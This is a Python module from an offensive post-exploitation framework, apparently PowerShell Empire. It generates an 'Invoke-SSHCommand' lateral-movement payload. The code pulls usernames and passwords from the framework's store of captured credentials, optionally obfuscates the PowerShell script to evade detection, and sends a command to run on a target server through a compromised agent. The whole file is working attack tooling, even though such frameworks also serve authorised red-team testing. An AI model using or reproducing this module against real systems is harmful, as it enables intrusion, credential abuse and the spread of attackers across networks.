from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SSHCommand',

            'Author': ['@424f424f'],

            'Description': ('Executes a command on a remote host via SSH.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'Open Source is the Best Source'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'IP' : {
                'Description'   :   'Address of the target server.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Username' : {
                'Description'   :   'The username to login with.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'The password to login with.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Command' : {
                'Description'   :   'The command to run on the remote host.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-SSHCommand.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "\nInvoke-SSHCommand "

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if userName != "":
                self.options["Username"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = str(password)

        if self.options["Username"]['Value'] == "":
            print helpers.color("[!] Either 'CredId' or Username/Password must be specified.")
            return ""
        if self.options["Password"]['Value'] == "":
            print helpers.color("[!] Either 'CredId' or Username/Password must be specified.")
            return ""
            
        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
